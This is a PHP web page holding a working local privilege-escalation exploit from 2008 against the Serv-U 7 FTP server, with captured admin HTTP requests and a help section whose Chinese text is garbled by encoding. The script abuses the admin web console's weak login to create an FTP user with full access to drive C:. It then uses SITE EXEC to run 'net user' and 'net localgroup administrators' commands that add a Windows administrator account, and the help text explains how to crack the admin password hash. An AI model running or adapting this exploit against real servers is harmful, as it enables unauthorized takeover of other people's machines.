<?
/*
	serv-u 7 local exp ver 1.0
	www.inbreak.net
	author kxlzx@xiaotou.org 2008-11-19
	modify 2008-11-20 	
*/

/*


�������õ�����Ҫ���ݰ���������о��á��������asp��������дһ�Σ����Բο���
Global user list:
GET /Admin/XML/OrganizationUsers.xml&ID=161&sync=1227078625078&ForceList=1 HTTP/1.1
Accept: 
Accept-Language: zh-cn
Referer: http://127.0.0.1:43958/Admin/ServerUsers.htm?Page=1
Content-Type: application/x-www-form-urlencoded
UA-CPU: x86
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)
Host: 127.0.0.1:43958
Connection: Keep-Alive
Cookie: domainid=3841; domainodbc=0; SULang=zh,CN; domainname=g; homelinktip=false; 
killmenothing; 
Session=bbd30833f99ff4a5e8d4d7849358ef196ad7a83539d7cf25fcd0b097930494fbfe8d25787a8544280754
581406246bf8

Global c:\|RWADNELCRNI:
POST /Admin/XML/Result.xml?Command=AddObject&Object=CServer.0.DirAccess&Sync=1227081261640 HTTP/1.1
Accept: 
Accept-Language: zh-cn
Referer: http://127.0.0.1:43958/Admin/ServerDir.htm?Page=1
User-Agent: Serv-U
Content-Type: application/x-www-form-urlencoded
UA-CPU: x86
Accept-Encoding: gzip, deflate
Host: 127.0.0.1:43958
Content-Length: 67
Connection: Keep-Alive
Cache-Control: no-cache
Cookie: domainid=3841; domainodbc=0; SULang=zh,CN; domainname=g; homelinktip=false; killmenothing; Session=bbd30833f99ff4a5e8d4d7849358ef196ad7a83539d7cf25fcd0b097930494fbfe8d25787a8544280754581406246bf8

Access=7999&MaxSize=0&Dir=%2Fc%3A&undefined=undefined&MaxSizeDisp=&

this user c:\|RWADNELCRNI:
POST /Admin/XML/Result.xml?Command=AddObject&Object=CUser.618060.DirAccess&Sync=1227081437828 HTTP/1.1
Accept: 
Accept-Language: zh-cn
Referer: http://127.0.0.1:43958/Admin/ServerUsers.htm?Page=1
User-Agent: Serv-U
Content-Type: application/x-www-form-urlencoded
UA-CPU: x86
Accept-Encoding: gzip, deflate
Host: 127.0.0.1:43958
Content-Length: 67
Connection: Keep-Alive
Cache-Control: no-cache
Cookie: domainid=3841; domainodbc=0; SULang=zh,CN; domainname=g; homelinktip=false; killmenothing; Session=bbd30833f99ff4a5e8d4d7849358ef196ad7a83539d7cf25fcd0b097930494fbfe8d25787a8544280754581406246bf8

Access=7999&MaxSize=0&Dir=%2Fc%3A&undefined=undefined&MaxSizeDisp=&

------------------------------����֮��---------------
�ڴ���������������
��su�����û���Ҫ��̫��
������������д����

*/
	
?>
<html>
	<title>Serv-u 7 local exp ver 1.0 by kxlzx</title>
	<body>
	<script>
	function fun_showDiv(show)
	{
		document.getElementById(show).style.display="block";
	}
	</script>
	<b>Serv-u 7 local exp ver 1.0 by kxlzx</b>
		<form id="form1" name="form1" method="post" action="?">
				<p><a href="#" onclick="fun_showDiv('adminpassdiv')">����Ա����</a>
				&nbsp; <input type="text" name="admin_pwd" value="" />
			  </p>
			  <p>ֱ����Ȩ��
				&nbsp; <input type="submit" name="cmd" value="��Ȩ" />&nbsp;&nbsp;
				<a href="#" onclick="fun_showDiv('QAdiv')">QA</a>
			  </p>
			  <pre>

<?

//Global var
	$port=43958;
	$host="127.0.0.1";
	$sessionid="";
	$getuserid="";
	$ftpport=21;
	$ftpuser="kxlzx_hacked";
	$ftppwd=$_POST['admin_pwd'];
	$exec_addUser="site exec c:/windows/system32/net.exe user ".$ftpuser." ".$ftppwd." /add";
	$exec_addGroup="site exec c:/windows/system32/net.exe localgroup administrators ".$ftpuser."  /add";

if($_POST['cmd']) {

//login-----------------------------------------
	$sock_login = fsockopen($host, $port);
	$URL='/Web%20Client/Login.xml?Command=Login&Sync=1543543543543543';
	$post_data_login['user'] = "";
	$post_data_login['pword'] = $ftppwd;
	$post_data_login['language'] = "zh%2CCN&";
	$ref="http://".$host.":".$port."/?Session=39893&Language=zh,CN&LocalAdmin=1";
	$postStr = createRequest($port,$host,$URL,$post_data_login,$sessionid,$ref);
	fputs($sock_login, $postStr);
	$result = fread($sock_login, 1280);	
	$sessionid = getmidstr("<sessionid>","</sessionid>",$result);
	if ($sessionid!="")
		echo "��½�ɹ���\r\n";
	fclose($sock_login);
//login-----------------------------------------

//getOrganizationId-------------------------------
	$OrganizationId="";
	$sock_OrganizationId = fsockopen($host, $port);
	$URL='/Admin/ServerUsers.htm?Page=1';
	$postStr = createRequest($port,$host,$URL,"",$sessionid,"");
	fputs($sock_OrganizationId, $postStr);
	$resultOrganizationId="";
	while(!feof($sock_OrganizationId)) {
		$result = fread($sock_OrganizationId, 1024);	
		$resultOrganizationId=$resultOrganizationId.$result;
	}
	$strTmp = "OrganizationUsers.xml&ID=";
	$OrganizationId = substr($resultOrganizationId,strpos($resultOrganizationId,$strTmp)+strlen($strTmp),strlen($strTmp)+15);
	$OrganizationId = substr($OrganizationId,0,strpos($OrganizationId,"\""));
	fclose($sock_OrganizationId);
	if ($OrganizationId!="")
		echo "��ȡOrganizationId".$OrganizationId."�ɹ���\r\n";
//getOrganizationId-------------------------------

//getuserid---------------------------------------
	$getuserid="";
	$sock_getuserid = fsockopen($host, $port);
	$URL="/Admin/XML/User.xml?Command=AddObject&Object=COrganization.".$OrganizationId.".User&Temp=1&Sync=546666666666666663";
	$ref="http://".$host.":".$port."/Admin/ServerUsers.htm?Page=1";
	$post_data_getuserid="";
	$postStr = createRequest($port,$host,$URL,$post_data_getuserid,$sessionid,$ref);
	fputs($sock_getuserid, $postStr);
	$result = fread($sock_getuserid, 1280);	
	$result = getmidstr("<var name=\"ObjectID\" val=\"","\" />",$result);
	fclose($sock_getuserid);
	$getuserid = $result;
	if ($getuserid!="")
		echo "��ȡ�û�ID".$getuserid."�ɹ���\r\n";
//getuserid---------------------------------------

//adduser-----------------------------------------
	$sock_adduser = fsockopen($host, $port);
	$URL="/Admin/XML/Result.xml?Command=UpdateObject&Object=COrganization.".$OrganizationId.".User.".$getuserid."&Sync=1227071190250";
	$post_data_adduser['LoginID'] = $ftpuser;
	$post_data_adduser['FullName'] = "";
	$post_data_adduser['Password'] = 'hahaha';
	$post_data_adduser['ComboPasswordType'] = "%E5%B8%B8%E8%A7%84%E5%AF%86%E7%A0%81";
	$post_data_adduser['PasswordType'] = "0";
	$post_data_adduser['ComboAdminType'] = "%E6%97%A0%E6%9D%83%E9%99%90";
	$post_data_adduser['AdminType'] = "";
	$post_data_adduser['ComboHomeDir'] = "/c:";
	$post_data_adduser['HomeDir'] = "/c:";
	$post_data_adduser['ComboType'] = "%E6%B0%B8%E4%B9%85%E5%B8%90%E6%88%B7";
	$post_data_adduser['Type'] = "0";
	$post_data_adduser['ExpiresOn'] = "0";
	$post_data_adduser['ComboWebClientStartupMode'] = "%E6%8F%90%E7%A4%BA%E7%94%A8%E6%88%B7%E4%BD%BF%E7%94%A8%E4%BD%95%E7%A7%8D%E5%AE%A2%E6%88%B7%E7%AB%AF";
	$post_data_adduser['WebClientStartupMode'] = "";
	$post_data_adduser['LockInHomeDir'] = "0";
	$post_data_adduser['Enabled'] = "1";
	$post_data_adduser['AlwaysAllowLogin'] = "1";
	$post_data_adduser['Description'] = "";
	$post_data_adduser['IncludeRespCodesInMsgFiles'] = "";
	$post_data_adduser['ComboSignOnMessageFilePath'] = "";
	$post_data_adduser['SignOnMessageFilePath'] = "";
	$post_data_adduser['SignOnMessage'] = "";
	$post_data_adduser['SignOnMessageText'] = "";
	$post_data_adduser['ComboLimitType'] = "%E8%BF%9E%E6%8E%A5";
	$post_data_adduser['LimitType'] = "Connection";
	$post_data_adduser['QuotaBytes'] = "0";
	$post_data_adduser['Quota'] = "0";
	$post_data_adduser['Access'] = "7999";
	$post_data_adduser['MaxSize'] = "0";
	$post_data_adduser['Dir'] = "%25HOME%25";
	$postStr = createRequest($port,$host,$URL,$post_data_adduser,$sessionid,"http://127.0.0.1".":".$port."/Admin/ServerUsers.htm?Page=1");
	fputs($sock_adduser, $postStr,strlen($postStr));
	$result = fread($sock_adduser, 1280);	
	fclose($sock_adduser);
	echo "����û��ɹ���\r\n";
//adduser-----------------------------------------

//addpower-----------------------------------------
	$sock_addpower = fsockopen($host, $port);
	$URL="/Admin/XML/Result.xml?Command=AddObject&Object=CUser.".$getuserid.".DirAccess&Sync=1227081437828";
	$post_data_addpower['Access'] = "7999";
	$post_data_addpower['MaxSize'] = "0";
	$post_data_addpower['Dir'] = "/c:";
	$post_data_addpower['undefined'] = "undefined";
	$postStr = createRequest($port,$host,$URL,$post_data_addpower,$sessionid,"http://127.0.0.1".":".$port."/Admin/ServerUsers.htm?Page=1");
	fputs($sock_addpower, $postStr,strlen($postStr));
	$result = fread($sock_addpower, 1280);	
	fclose($sock_addpower);
	echo "���Ȩ�޳ɹ���\r\n";

//addpower-----------------------------------------

//exec-------------------------------
	$sock_exec = fsockopen("127.0.0.1", $ftpport, &$errno, &$errstr, 10);
	$recvbuf = fgets($sock_exec, 1024);
	$sendbuf = "USER ".$ftpuser."\r\n";
	fputs($sock_exec, $sendbuf, strlen($sendbuf));
	$recvbuf = fgets($sock_exec, 1024);

	$sendbuf = "PASS hahaha\r\n";
	fputs($sock_exec, $sendbuf, strlen($sendbuf));
	$recvbuf = fgets($sock_exec, 1024);

	$sendbuf = $exec_addUser."\r\n";
	fputs($sock_exec, $sendbuf, strlen($sendbuf));
	$recvbuf = fread($sock_exec, 1024);
	echo "ִ��".$exec_addUser."\r\n������$recvbuf\r\n";
	

	$sendbuf = $exec_addGroup."\r\n";
	fputs($sock_exec, $sendbuf, strlen($sendbuf));
	$recvbuf = fread($sock_exec, 1024);

	echo "ִ��".$exec_addGroup."\r\n������$recvbuf\r\n";
	fclose($sock_exec);
	echo "���ˣ��Լ�3389��ȥ����ftp�û���־�ɣ�\r\n";
//exec-------------------------------

}

/** function createRequest
	@author : kxlzx 2008-11-19
	@port_post : administrator port $port=43958;
	@host_post : host $host="127.0.0.1";
	@URL_post : target $URL='/Web%20Client/Login.xml?Command=Login&Sync=1543543543543543';
	@post_data_post : arraylist $post_data['user'] = "";...
	@return httprequest string
*/
function createRequest($port_post,$host_post,$URL_post,$post_data_post,$sessionid,$referer){
	$data_string="";
	if ($post_data_post!="")
	{
		foreach($post_data_post as $key=>$value)
		{
			$values[]="$key=".urlencode($value);
		}
		$data_string=implode("&",$values);
	}
	$request.="POST ".$URL_post." HTTP/1.1\r\n";
	$request.="Host: ".$host_post."\r\n";
	$request.="Referer: ".$referer."\r\n";
	$request.="Content-type: application/x-www-form-urlencoded\r\n";
	$request.="Content-length: ".strlen($data_string)."\r\n";
	$request.="User-Agent: Serv-U\r\n";
	$request.="x-user-agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)\r\n";
	$request.="Accept: */*\r\n";
	$request.="Cache-Contro: no-cache\r\n";
	$request.="UA-CPU: x86\r\n";
	
	if ($sessionid!="")
	{
		$request.="Cookie: Session=".$sessionid."\r\n";
	}
	$request.="\r\n";
	$request.=$data_string."\r\n";

	return $request;
}

//getMidfor2str copy from internet
function getmidstr($L,$R,$str)
{  
	$int_l=strpos($str,$L);
	$int_r=strpos($str,$R);
	If ($int_l>-1&&$int_l>-1)
	{
		$str_put=substr($str,$int_l+strlen($L),($int_r-$int_l-strlen($L)));
		return $str_put;
	}
	else
		return "û�ҵ���Ҫ�ı���������ϵkxlzx@xiaotou.org";
}
?>
			  </pre>
		</form>
<div id="adminpassdiv" style="display:none">
<pre>
Ĭ��Ϊ�գ��������Ϊ�գ�<b>��ʲô���ܽ�ȥ��</b>
����޸Ĺ�������Ա����Ĭ�ϻ������
<b>C:\Program Files\RhinoSoft.com\Serv-U\Users\Local Administrator Domain\.Archive</b>
�ļ����ҵ�һ��MD5����ֵ��
C:\Program Files\RhinoSoft.com\Serv-U
��su�ĸ�Ŀ¼��
����ֵ����ʽΪ(������123456)
kx#######################
#����123456��32λMD5���ܣ���kx����su��md5�������㷨�Ľ������2λ�ַ���
�ƽ�������Ϊ<b>kx</b>123456��ȥ��kx���������ˡ�
��������������������ֵ䡣

auther:kxlzx www.inbreak.net
</pre>
</div>
<div id="QAdiv" style="display:none">
<pre>
<b>һ��su7����Ȩ�м��ַ�ʽ��</b>
	��������ʽȥ�ɵ�su7��
	1>����½����Ա����̨��ҳ��
			==>��ȡOrganizationId����������û�
			==>��ȡȫ���û��ġ���һ�����û�ID��
			==>����û�
			==>����û���Ȩ�� or ���ȫ���û�Ȩ��
			==>�û���½
			==>ִ��ϵͳ�������ϵͳ�˻���
	2>����½����Ա����̨ҳ��
			==>����WEB�ͻ���
			==>����serv-u��Ŀ¼��--users--Global userĿ¼
			==>�ϴ�һ�����Ѿ�����õ��û��ļ�
			==>�û���½
			==>ִ��ϵͳ�������ϵͳ�˻�
	�����ļ�ʹ����<b>��һ��</b>������
<b>������Ȩ��ԭ��</b>
	Su7�Ĺ���ƽ̨��http�ģ����Ƚ���
	ץ��������������������·���ǿ������õġ�
	1��	����Ա�ӹ������̨��webҳ��ʱ���ǲ���Ҫ��֤����ġ�
	2��	����Ա�����ĳURL��webҳ��ʱ����Ȼ��Ҫ�������룬������������ʲô�������Խ��롣��/?Session=39893&Language=zh,CN&LocalAdmin=1��
	3��	����Ա��������û������֣�һ����ȫ���û���һ����ĳ�����µ��û�����Ȩ������Ҳ�����֣�һ����ȫ�֣�һ��������û���
	4��	����Ա������û��������������Ȩ����������Ƿֿ��ġ�
	���ԣ��ҿ���ץ��Ȼ��ת����php��socket����post��ȥ��
	������þ����ftp��½��exec����ﵽ��Ȩ��
	��дphp�Ĺ����У������ܶ����⣬���纯�������õȵȣ���_��!��ǰûѧ��php������л������ţ����æ������
	�ڷ����������̣�������һЩ���������������ص����ݣ�ȫ����xml��ʽ�����ġ��������ݴ���Ĺ����У���Ƶĺܾ��䡣
	Su7Ҳ���Լ������ݿ⣬��Ҳ���Լ�����һ��id��
	���ID������ģ����㴴���û�ʱ�������������������һ�������ɺú��޸ĸ�id���û���������ȡ�
	�����oracle��insert�ֶΡ�

	д���ߵĹ����У������ܶ��鷳�������鷳�������ID���⣬�������������ˡ�
	���Ȩ��ʱ��Ҳ�ǿ����������ID�ġ�
	���ǹ���һ��������6�η��������⼸�ηֱ��ǣ�
	1��	������½ƽ̨��ʹ���Ǹ������κ����붼���Ե�½��ҳ���ַ������һ��sessionid�����sessionid���Ժ�İ����õ��ˡ�
	2��	��ȡOrganizationId����������û�
	3��	��������һ���û�ID��
	4��	�޸ĸ�ID�ĵ�½�û��������롣
	5��	�޸ĸ�ID��Ȩ�ޣ���c�̵�дɾִ�еȡ�
	6��	��������������µģ�ʹ��ǰ����ӵ��û�ִ��ϵͳ���
<b>����Ϊɶ��������ʾ�ɹ��ˣ�����ȴ�᲻��ȥ��</b>
	��Ҫ����������ˣ�����ż�ܲ�������û��д��ϸ�Ĵ�������жϡ�
	һ�������¼��������
	1����������Ϊ����Ա���벻�ԡ�
		���չ���Ա��������ӡ�
	2����������Ϊ����Ա������ִ��SITE EXEC��
		�д������޸ģ�������Լ�һ�����������ƵĹ��ܡ�
	3�������ǳ������⡣
	<b>4��Ϊɶ��������ô�����ɲ�ȥ�ģ�</b>
	��û����ô��һ���Ѷ����������ˣ��ǱȽ�ϵͳ�ķ��������ͳ����ˡ�
	�����������������Ϊ���Ǿ�����ֶΣ�����ϵͳҲ����ô��Ϊ��
	���ŵĻ�������ʱ�䣬�������������ˣ��϶���һ�������޸�site execΪ���ɷ��ʡ���
	��ʱ������д�����ܣ���������Ļ������ǡ�
	���ԣ��ȴ�Ҷ��ᳫҪXXXX��ʱ�����ٽ��XXXX�����⡣�������ô���Ű�:)







auther:kxlzx www.inbreak.net



</pre>
</div>
	</body>
</html>